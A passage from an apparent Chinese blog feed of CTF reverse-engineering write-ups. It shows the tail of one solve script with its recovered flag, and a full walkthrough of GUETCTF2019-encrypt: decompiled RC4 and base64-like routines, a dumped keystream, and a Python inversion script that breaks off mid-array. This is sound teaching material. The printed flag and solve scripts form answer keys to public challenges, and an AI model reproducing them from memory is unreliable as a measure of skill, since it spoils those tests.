class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>, <span class="number">0x4DC0B5EA935F08EC</span>,</span><br><span class="line">     <span class="number">0x342B90AFD853F450</span>, <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">          b = s &amp; <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">               s ^= <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">          s //= <span class="number">2</span></span><br><span class="line">          <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">               s |= <span class="number">0x8000000000000000</span></span><br><span class="line">     <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">     j = <span class="number">0</span></span><br><span class="line">     <span class="keyword">while</span> j &lt; <span class="number">8</span>:</span><br><span class="line">          flag += <span class="built_in">chr</span>(s &amp; <span class="number">0xFF</span>)</span><br><span class="line">          s &gt;&gt;= <span class="number">8</span></span><br><span class="line">          j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到<strong> flag {6ff29390-6c20-4c56-ba70-a95758e3d1f8}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GUETCTF2019-encrypt</title>
      <link href="/2022/07/21/GUETCTF2019-encrypt/"/>
      <url>/2022/07/21/GUETCTF2019-encrypt/</url>
      
        <content type="html"><![CDATA[<p>这道题的总体思路还是比较清晰的，没有搞一些乱七八糟的东西来混淆我们，它就是用三个函数对输入的 flag 进行加密之后，再和 byte_602080 对比</p><h1 id="主函数"><a class="markdownIt-Anchor" href="#主函数">#</a> 主函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-93Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-938h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-934h]</span></span><br><span class="line">  _DWORD v9[<span class="number">260</span>]; <span class="comment">// [rsp+10h] [rbp-930h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">16</span>]; <span class="comment">// [rsp+420h] [rbp-520h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+430h] [rbp-510h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">1032</span>]; <span class="comment">// [rsp+530h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+938h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">32</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">48</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">48</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">32</span>;</span><br><span class="line">  v10[<span class="number">5</span>] = <span class="number">32</span>;</span><br><span class="line">  v10[<span class="number">6</span>] = <span class="number">16</span>;</span><br><span class="line">  v10[<span class="number">7</span>] = <span class="number">64</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0x408</span>uLL);</span><br><span class="line">  sub_4006B6(v9, v10, <span class="number">8</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  sub_4007DB(v9, s, v3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  sub_4008FA(s, v4, v12, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v12[i] != byte_602080[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组的值已经给出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x5A</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x44</span>, <span class="number">0x7C</span>, <span class="number">0x66</span>,</span><br><span class="line"> <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>,</span><br><span class="line"> <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0x55</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>,</span><br><span class="line"> <span class="number">0x4A</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x5A</span>, <span class="number">0x70</span>,</span><br><span class="line"> <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x5A</span>,</span><br><span class="line"> <span class="number">0x45</span>, <span class="number">0x3D</span>]</span><br></pre></td></tr></table></figure><p>接下来就看三个函数分别做了些什么吧</p><h1 id="sub_4006b6函数"><a class="markdownIt-Anchor" href="#sub_4006b6函数">#</a> sub_4006B6 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_4006B6</span><span class="params">(_DWORD *a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+28h] [rbp-Ch]</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// [rsp+2Ch] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v9 = a1 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    v9[i] = i;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v6) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v9[j];</span><br><span class="line">    v6 = (v6 + v8 + *(v7 + a2));</span><br><span class="line">    v9[j] = v9[v6];</span><br><span class="line">    v9[v6] = v8;</span><br><span class="line">    result = ++v7 &gt;= a3;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= a3 )</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显可以看出就是 RC4 加密，这里是在创建 S 盒，并且进行了一部分的置换</p><h1 id="sub_4007db函数"><a class="markdownIt-Anchor" href="#sub_4007db函数">#</a> sub_4007DB 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_4007DB</span><span class="params">(_DWORD *a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+28h] [rbp-Ch]</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// [rsp+2Ch] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = *a1;</span><br><span class="line">  v6 = a1[<span class="number">1</span>];</span><br><span class="line">  v9 = a1 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>);</span><br><span class="line">    v7 = v9[v5];</span><br><span class="line">    v6 = (v6 + v7);</span><br><span class="line">    v8 = v9[v6];</span><br><span class="line">    v9[v5] = v8;</span><br><span class="line">    v9[v6] = v7;</span><br><span class="line">    *(i + a2) ^= LOBYTE(v9[(v7 + v8)]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v5;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1[<span class="number">1</span>] = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是 RC4 加密的后一部分，再进行了最后的 S 盒的置换后，用新的 S 盒和我们输入的 flag 进行异或运算，得到加密后的结果，这里 v9 就是最后的 S 盒，a2 是 flag</p><h1 id="sub_4008fa函数"><a class="markdownIt-Anchor" href="#sub_4008fa函数">#</a> sub_4008FA 函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_4008FA</span><span class="params">(__int64 a1, <span class="type">int</span> a2, <span class="type">const</span> <span class="type">char</span> *a3, _DWORD *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+2Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+2Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v17 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v17++;</span><br><span class="line">    v13 = *(v4 + a1);</span><br><span class="line">    <span class="keyword">if</span> ( v17 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v17++;</span><br><span class="line">      v6 = *(v5 + a1);</span><br><span class="line">    &#125;</span><br><span class="line">    v14 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v17++;</span><br><span class="line">      v8 = *(v7 + a1);</span><br><span class="line">    &#125;</span><br><span class="line">    v15 = v8;</span><br><span class="line">    a3[v16] = ((v13 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>) + <span class="number">61</span>;</span><br><span class="line">    a3[v16 + <span class="number">1</span>] = (((v14 &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * v13)) &amp; <span class="number">0x3F</span>) + <span class="number">61</span>;</span><br><span class="line">    a3[v16 + <span class="number">2</span>] = (((v8 &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * v14)) &amp; <span class="number">0x3F</span>) + <span class="number">61</span>;</span><br><span class="line">    v9 = v16 + <span class="number">3</span>;</span><br><span class="line">    v16 += <span class="number">4</span>;</span><br><span class="line">    a3[v9] = (v15 &amp; <span class="number">0x3F</span>) + <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a3[--v16] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 % <span class="number">3</span> != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  a3[v16 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">  v10 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  result = a4;</span><br><span class="line">  *a4 = v10;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数很像 base64，因为它在 43~48 行有一个三字节变四字节的操作，不过又不是完整的 base64，感觉也不像是换表的操作，根本没有找到表，所以最后还是直接逆运算搞出来了</p><h1 id="整体思路"><a class="markdownIt-Anchor" href="#整体思路">#</a> 整体思路</h1><p>前两个函数是 RC4 加密，具体的 v9 值可以动调提取数据</p><img src="/2022/07/21/GUETCTF2019-encrypt/1.png" class><p>通过汇编代码可以看出来这个 v9 的值应该就是 edx 里面的值了，esi 是输入的值，动调的时候直接在 xor 这里下个断点就可以看了，下面是 v9 的值也就是最后的 S 盒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x9C</span>, <span class="number">0x92</span>, <span class="number">0x06</span>, <span class="number">0x22</span>, <span class="number">0xCF</span>, <span class="number">0xA5</span>, <span class="number">0x72</span>, <span class="number">0x1E</span>,</span><br><span class="line"> <span class="number">0x45</span>, <span class="number">0x6A</span>, <span class="number">0x06</span>, <span class="number">0xCB</span>, <span class="number">0x08</span>, <span class="number">0xC3</span>, <span class="number">0xE4</span>, <span class="number">0x49</span>, <span class="number">0x5A</span>, <span class="number">0x63</span>,</span><br><span class="line"> <span class="number">0x0C</span>, <span class="number">0xDF</span>, <span class="number">0xF6</span>, <span class="number">0x5F</span>, <span class="number">0x08</span>, <span class="number">0x28</span>, <span class="number">0xBD</span>, <span class="number">0xE2</span>, <span class="number">0x10</span>, <span class="number">0x15</span>,</span><br><span class="line"> <span class="number">0x1F</span>, <span class="number">0x6E</span>, <span class="number">0xAA</span>, <span class="number">0x5A</span>, <span class="number">0xCA</span>, <span class="number">0xEC</span>, <span class="number">0x80</span>, <span class="number">0xAF</span>, <span class="number">0x9B</span>, <span class="number">0x16</span>,</span><br><span class="line"> <span class="number">0xBB</span>, <span class="number">0x3D</span>, <span class="number">0x13</span>, <span class="number">0x2F</span>, <span class="number">0x6A</span>, <span class="number">0xA4</span>, <span class="number">0xC7</span>, <span class="number">0x2E</span>, <span class="number">0xBC</span>, <span class="number">0x4B</span>,</span><br><span class="line"> <span class="number">0x60</span>, <span class="number">0x9A</span>, <span class="number">0xAF</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0xDA</span>, <span class="number">0x67</span>, <span class="number">0x39</span>, <span class="number">0xBA</span>, <span class="number">0x3B</span>,</span><br><span class="line"> <span class="number">0x85</span>, <span class="number">0xEB</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0xAB</span>, <span class="number">0x06</span>, <span class="number">0x6B</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span class="number">0x2C</span>,</span><br><span class="line"> <span class="number">0x88</span>, <span class="number">0x70</span>, <span class="number">0xF7</span>, <span class="number">0x4F</span>, <span class="number">0xAA</span>, <span class="number">0x7F</span>, <span class="number">0x12</span>, <span class="number">0x47</span>, <span class="number">0xD6</span>, <span class="number">0xDE</span>,</span><br><span class="line"> <span class="number">0x74</span>, <span class="number">0xB2</span>, <span class="number">0x1D</span>, <span class="number">0xA4</span>, <span class="number">0xD7</span>, <span class="number">0x76</span>, <span class="number">0x9A</span>, <span class="number">0xE0</span>]</span><br></pre></td></tr></table></figure><p>在输入的 flag 和这个 v9 异或之后，又在第三个函数中将其 3 变 4，并有一点点的运算在里面，这个我们直接拿最后的结果反向算一遍就可以了</p><img src="/2022/07/21/GUETCTF2019-encrypt/2.png" class><p>其中 v13，v14，v8 也就是 v15，分别是原来的三个字节，而在这里它被改变成了 a3 [v16] 到 a3 [v16+3] 相当于四个字节，所以原来的三个字节就是前两个函数加密后的结果，我们只要把它四个四个一组恢复成三字节就行了，还要注意一下这个位移和与运算的关系，v14 和 v15 放到一起的时候要把 0x3F 拆开，不然 flag 会不完整</p><h1 id="脚本"><a class="markdownIt-Anchor" href="#脚本">#</a> 脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x5A</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x44</span>, <span class="number">0x7C</span>, <span class="number">0x66</span>,</span><br><span class="line">     <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>,</span><br><span class="line">     <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0x55</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>,</span><br><span class="line">     <span class="number">0x4A</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x5A</span>, <span class="number">0x70</span>,</span><br><span class="line">     <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x6C</span>, <span class="number">0x48</span>, <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x5A</span>,</span><br><span class="line">     <span class="number">0x45</span>, <span class="number">0x3D</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>((((a[i] - <span class="number">61</span>) &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">2</span>) | (((a[i+<span class="number">1</span>] - <span class="number">61</span>) &amp; <span class="number">0x30</span>) &gt;&gt; <span class="number">4</span>))</span><br><span class="line">    flag += <span class="built_in">chr</span>((((a[i+<span class="number">1</span>] - <span class="number">61</span>) &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (((a[i+<span class="number">2</span>] - <span class="number">61</span>) &amp; <span class="number">0x3C</span>) &gt;&gt; <span class="number">2</span>))  <span class="comment"># 这里0x30和0x3C可以去掉</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(((a[i+<span class="number">3</span>] - <span class="number">61</span>) &amp; <span class="number">0x3F</span>) | (((a[i+<span class="number">2</span>] - <span class="number">61</span>) &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">S = [<span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x9C</span>, <span class="number">0x92</span>, <span class="number">0x06</span>, <span class="number">0x22</span>, <span class="number">0xCF</span>, <span class="number">0xA5</span>, <span class="number">0x72</span>, <span class="number">0x1E</span>,</span><br><span class="line">     <span class="number">0x45</span>, <span class="number">0x6A</span>, <span class="number">0x06</span>, <span class="number">0xCB</span>, <span class="number">0x08</span>, <span class="number">0xC3</span>, <span class="number">0xE4</span>, <span class="number">0x49</span>, <span class="number">0x5A</span>, <span class="number">0x63</span>,</span><br><span class="line">     <span class="number">0x0C</span>, <span class="number">0xDF</span>, <span class="number">0xF6</span>, <span class="number">0x5F</span>, <span class="number">0x08</span>, <span class="number">0x28</span>, <span class="number">0xBD</span>, <span class="number">0xE2</span>, <span class="number">0x10</span>, <span class="number">0x15</span>,</span><br><span class="line">     <span class="number">0x1F</span>, <span class="number">0x6E</span>, <span class="number">0xAA</span>, <span class="number">0x5A</span>, <span class="number">0xCA</span>, <span class="number">0xEC</span>, <span class="number">0x80</span>, <span class="number">0xAF</span>, <span class="number">0x9B</span>, <span class="number">0x16</span>,</span><br><span class="line">     <span class="number">0xBB</span>, <span class="number">0x3D</span>, <span class="number">0x13</span>, <span class="number">0x2F</span>, <span class="number">0x6A</span>, <span class="number">0xA4</span>, <span class="number">0xC7</span>, <span class="number">0x2E</span>, <span class="number">0xBC</span>, <span class="number">0x4B</span>,</span><br><span class="line">     <span class="number">0x60</span>, <span class="number">0x9A</span>, <span class="number">0xAF</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0xDA</span>, <span class="number">0x67</span>, <span class="number">0x39</span>, <span class="number">0xBA</span>, <span class="number">0x3B</span>,</span><br><span class="line">     <span class="number">0x85</span>, <span class="number">0xEB</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0xAB</span>, <span class="number">0x06</span>, <span class="number">0x6B</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span 